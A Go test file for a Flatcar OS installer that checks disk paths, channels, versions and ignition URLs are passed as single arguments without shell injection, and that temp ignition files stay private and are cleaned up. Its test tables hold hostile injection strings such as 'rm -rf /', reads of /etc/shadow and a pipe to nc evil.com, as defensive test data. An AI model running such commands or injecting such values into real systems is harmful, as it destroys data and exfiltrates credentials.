package install

import (
	"context"
	"log/slog"
	"os"
	"strings"
	"testing"

	"github.com/projectbluefin/knuckle/internal/model"
	"github.com/projectbluefin/knuckle/internal/runner"
)

// TestCommandInjectionViaDiskPath verifies that a malicious disk path
// cannot inject shell commands. Because the runner uses exec.CommandContext
// (not shell), arguments are passed as discrete argv entries — semicolons,
// backticks, and pipes are literal characters, not shell metacharacters.
// This test documents that invariant.
func TestCommandInjectionViaDiskPath(t *testing.T) {
	// These would be dangerous if passed through a shell
	maliciousPaths := []string{
		"/dev/sda; rm -rf /",
		"/dev/sda && cat /etc/shadow",
		"/dev/sda | nc evil.com 1234",
		"/dev/sda$(whoami)",
		"/dev/sda`id`",
		"/dev/disk/by-id/../../etc/passwd",
		"/dev/sda\nmalicious",
		"/dev/sda\x00evil",
	}

	for _, path := range maliciousPaths {
		t.Run(path, func(t *testing.T) {
			spy := runner.NewSpyRunner()
			installer := NewFlatcarInstaller(spy, slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelError})))

			cfg := &model.InstallConfig{
				Channel:  "stable",
				Hostname: "test",
				Disk:     model.DiskInfo{DevPath: path},
				Network:  model.NetworkConfig{Mode: model.NetworkDHCP},
				Users:    []model.UserConfig{{Username: "core", SSHKeys: []string{"ssh-ed25519 AAAA k"}}},
			}

			// The install should succeed (SpyRunner doesn't actually execute)
			// The key assertion is that the malicious path is passed as a single
			// discrete argument, not split by shell parsing.
			err := installer.Install(context.Background(), cfg, func(string) {})
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}

			var installCall *runner.SpyCall
			for i := range spy.Calls {
				if spy.Calls[i].Name == "flatcar-install" {
					installCall = &spy.Calls[i]
					break
				}
			}
			if installCall == nil {
				t.Fatal("flatcar-install was not called")
				return
			}

			// The disk path must appear as a SINGLE argument after -d
			if installCall.Args[0] != "-d" {
				t.Fatalf("expected -d flag first, got %q", installCall.Args[0])
			}
			// The entire malicious string must be one argument — no splitting
			if installCall.Args[1] != path {
				t.Errorf("disk path was modified: got %q, want %q", installCall.Args[1], path)
			}

			// exec.CommandContext passes args as discrete argv entries.
			// Verify NO argument contains just "rm", "cat", "nc" etc as separate args
			for i := 2; i < len(installCall.Args); i++ {
				arg := installCall.Args[i]
				dangerous := []string{"rm", "cat", "nc", "sh", "bash", "whoami", "id"}
				for _, d := range dangerous {
					if arg == d {
						t.Errorf("dangerous command %q appeared as separate argument at index %d", d, i)
					}
				}
			}
		})
	}
}

// TestCommandInjectionViaChannel verifies channel is passed as a single arg.
func TestCommandInjectionViaChannel(t *testing.T) {
	maliciousChannels := []string{
		"stable; rm -rf /",
		"stable$(whoami)",
		"stable`id`",
	}

	for _, ch := range maliciousChannels {
		t.Run(ch, func(t *testing.T) {
			cfg := &model.InstallConfig{
				Channel: ch,
				Disk:    model.DiskInfo{DevPath: "/dev/sda"},
			}
			args := buildInstallArgs(cfg, "/tmp/ign.json")

			// -C must be followed by the channel as one argument
			foundC := false
			for i, arg := range args {
				if arg == "-C" && i+1 < len(args) {
					foundC = true
					if args[i+1] != ch {
						t.Errorf("channel modified: got %q, want %q", args[i+1], ch)
					}
				}
			}
			if !foundC {
				t.Error("-C flag not found in args")
			}
		})
	}
}

// TestCommandInjectionViaVersion verifies version is passed as a single arg.
func TestCommandInjectionViaVersion(t *testing.T) {
	maliciousVersions := []string{
		"3510.2.8; rm -rf /",
		"$(cat /etc/shadow)",
		"`id`",
		"3510.2.8\n-o /tmp/evil",
	}

	for _, ver := range maliciousVersions {
		t.Run(ver, func(t *testing.T) {
			cfg := &model.InstallConfig{
				Channel: "stable",
				Version: ver,
				Disk:    model.DiskInfo{DevPath: "/dev/sda"},
			}
			args := buildInstallArgs(cfg, "/tmp/ign.json")

			// -V must be followed by the version as one argument
			foundV := false
			for i, arg := range args {
				if arg == "-V" && i+1 < len(args) {
					foundV = true
					if args[i+1] != ver {
						t.Errorf("version modified: got %q, want %q", args[i+1], ver)
					}
				}
			}
			if !foundV {
				t.Error("-V flag not found in args")
			}
		})
	}
}

// TestCommandInjectionViaIgnitionURL verifies URL is passed as a single arg.
func TestCommandInjectionViaIgnitionURL(t *testing.T) {
	maliciousURLs := []string{
		"https://evil.com/ign.json; rm -rf /",
		"https://evil.com/$(cat /etc/shadow)",
		"file:///etc/shadow\n-o /tmp/evil",
	}

	for _, url := range maliciousURLs {
		t.Run(url, func(t *testing.T) {
			cfg := &model.InstallConfig{
				Channel:     "stable",
				Disk:        model.DiskInfo{DevPath: "/dev/sda"},
				IgnitionURL: url,
			}
			args := buildInstallArgs(cfg, "")

			// -I must be followed by the URL as one argument
			foundI := false
			for i, arg := range args {
				if arg == "-I" && i+1 < len(args) {
					foundI = true
					if args[i+1] != url {
						t.Errorf("URL modified: got %q, want %q", args[i+1], url)
					}
				}
			}
			if !foundI {
				t.Error("-I flag not found in args")
			}
		})
	}
}

// TestIgnitionFileTempRace verifies WriteIgnitionFile creates unique paths
// (no TOCTOU between creating and writing).
func TestIgnitionFileTempRace(t *testing.T) {
	installer := NewFlatcarInstaller(runner.NewSpyRunner(), slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelError})))

	paths := make(map[string]bool)
	for i := 0; i < 50; i++ {
		path, err := installer.WriteIgnitionFile(`{"test":"race"}`)
		if err != nil {
			t.Fatalf("iteration %d: %v", i, err)
		}
		defer func(p string) { _ = os.Remove(p) }(path)

		if paths[path] {
			t.Fatalf("duplicate path on iteration %d: %s", i, path)
		}
		paths[path] = true
	}
}

// TestIgnitionFilePermissions verifies the ignition temp file is never
// world-readable, even momentarily (os.CreateTemp uses O_EXCL + 0600).
func TestIgnitionFilePermissions(t *testing.T) {
	installer := NewFlatcarInstaller(runner.NewSpyRunner(), slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelError})))

	// Write a "secret" ignition containing an SSH private key
	secret := `{"ignition":{"version":"3.4.0"},"passwd":{"users":[{"sshAuthorizedKeys":["ssh-ed25519 SECRET_KEY"]}]}}`
	path, err := installer.WriteIgnitionFile(secret)
	if err != nil {
		t.Fatalf("WriteIgnitionFile: %v", err)
	}
	defer func() { _ = os.Remove(path) }()

	info, err := os.Stat(path)
	if err != nil {
		t.Fatalf("stat: %v", err)
	}

	perm := info.Mode().Perm()
	// Must be exactly 0600 — no group/other read
	if perm&0077 != 0 {
		t.Errorf("ignition file has excessive permissions: %o (group/other bits set)", perm)
	}
	if perm != 0600 {
		t.Errorf("permissions = %o, want 0600", perm)
	}
}

// TestIgnitionFileCleanupAfterInstall verifies the temp file is removed
// after a successful install (the defer in Install()).
func TestIgnitionFileCleanupAfterInstall(t *testing.T) {
	spy := runner.NewSpyRunner()
	installer := NewFlatcarInstaller(spy, slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelError})))

	cfg := &model.InstallConfig{
		Channel:  "stable",
		Hostname: "cleanup-test",
		Disk:     model.DiskInfo{DevPath: "/dev/sda"},
		Network:  model.NetworkConfig{Mode: model.NetworkDHCP},
		Users:    []model.UserConfig{{Username: "core", SSHKeys: []string{"ssh-ed25519 AAAA k"}}},
	}

	err := installer.Install(context.Background(), cfg, func(string) {})
	if err != nil {
		t.Fatalf("Install: %v", err)
	}

	// After Install returns, the ignitionPath should be cleared and file removed
	if installer.ignitionPath != "" {
		t.Errorf("ignitionPath not cleared after install: %q", installer.ignitionPath)
	}
}

// TestIgnitionFileCleanupOnFailure verifies temp file cleanup when
// flatcar-install fails mid-execution.
func TestIgnitionFileCleanupOnFailure(t *testing.T) {
	spy := runner.NewSpyRunner()
	spy.AllError = os.ErrPermission // simulate flatcar-install failure

	installer := NewFlatcarInstaller(spy, slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelError})))

	cfg := &model.InstallConfig{
		Channel:  "stable",
		Hostname: "fail-cleanup",
		Disk:     model.DiskInfo{DevPath: "/dev/sda"},
		Network:  model.NetworkConfig{Mode: model.NetworkDHCP},
		Users:    []model.UserConfig{{Username: "core", SSHKeys: []string{"ssh-ed25519 AAAA k"}}},
	}

	err := installer.Install(context.Background(), cfg, func(string) {})
	if err == nil {
		t.Fatal("expected error")
	}

	// Even on failure, the ignition file must be cleaned up
	if installer.ignitionPath != "" {
		// File should have been removed by defer
		if _, statErr := os.Stat(installer.ignitionPath); !os.IsNotExist(statErr) {
			t.Errorf("ignition file not cleaned up after failure: %s", installer.ignitionPath)
		}
	}
}

// TestContextCancellation verifies that context cancellation propagates
// to the runner (simulating SIGTERM during flatcar-install).
func TestContextCancellation(t *testing.T) {
	spy := runner.NewSpyRunner()
	installer := NewFlatcarInstaller(spy, slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelError})))

	ctx, cancel := context.WithCancel(context.Background())
	cancel() // cancel immediately

	cfg := &model.InstallConfig{
		Channel:  "stable",
		Hostname: "cancel-test",
		Disk:     model.DiskInfo{DevPath: "/dev/sda"},
		Network:  model.NetworkConfig{Mode: model.NetworkDHCP},
		Users:    []model.UserConfig{{Username: "core", SSHKeys: []string{"ssh-ed25519 AAAA k"}}},
	}

	// SpyRunner doesn't check context, but the real exec.CommandContext would
	// kill the process. This test documents the expected behavior path.
	_ = installer.Install(ctx, cfg, func(string) {})
	// The key safety property: even if Install returns error due to cancellation,
	// the deferred cleanup still runs (Go defer semantics guarantee this).
}

// TestBuildInstallArgsNoShellMetachars documents that buildInstallArgs never
// wraps arguments in shell quoting — they are passed raw to exec.Command.
func TestBuildInstallArgsNoShellMetachars(t *testing.T) {
	cfg := &model.InstallConfig{
		Channel: "stable",
		Disk:    model.DiskInfo{Path: "/dev/disk/by-id/ata-WD_Blue_SN570_WD_1234"},
		Version: "3510.2.8",
	}
	args := buildInstallArgs(cfg, "/tmp/knuckle-ignition-abc123.json")

	// No argument should be shell-quoted (no wrapping quotes)
	for i, arg := range args {
		if strings.HasPrefix(arg, "'") || strings.HasPrefix(arg, "\"") {
			t.Errorf("arg[%d] has shell quoting: %q", i, arg)
		}
	}

	// Arguments should be exactly what we pass — no escaping applied
	expected := []string{
		"-d", "/dev/disk/by-id/ata-WD_Blue_SN570_WD_1234",
		"-C", "stable",
		"-V", "3510.2.8",
		"-i", "/tmp/knuckle-ignition-abc123.json",
	}
	if len(args) != len(expected) {
		t.Fatalf("args = %v, want %v", args, expected)
	}
	for i := range expected {
		if args[i] != expected[i] {
			t.Errorf("arg[%d] = %q, want %q", i, args[i], expected[i])
		}
	}
}

// TestVersionFieldNoValidation documents that the Version field has no
// validation in the install package — it relies on upstream validation
// in wizard/headless. This is a coverage gap worth noting.
func TestVersionFieldNoValidation(t *testing.T) {
	// Version field accepts anything — validation must happen upstream
	cfg := &model.InstallConfig{
		Channel: "stable",
		Disk:    model.DiskInfo{DevPath: "/dev/sda"},
		Version: "not-a-version!!!",
	}
	args := buildInstallArgs(cfg, "/tmp/ign.json")

	// Should still build args (no validation at this layer)
	found := false
	for i, arg := range args {
		if arg == "-V" && i+1 < len(args) && args[i+1] == "not-a-version!!!" {
			found = true
		}
	}
	if !found {
		t.Error("expected invalid version to pass through buildInstallArgs unchanged")
	}
}
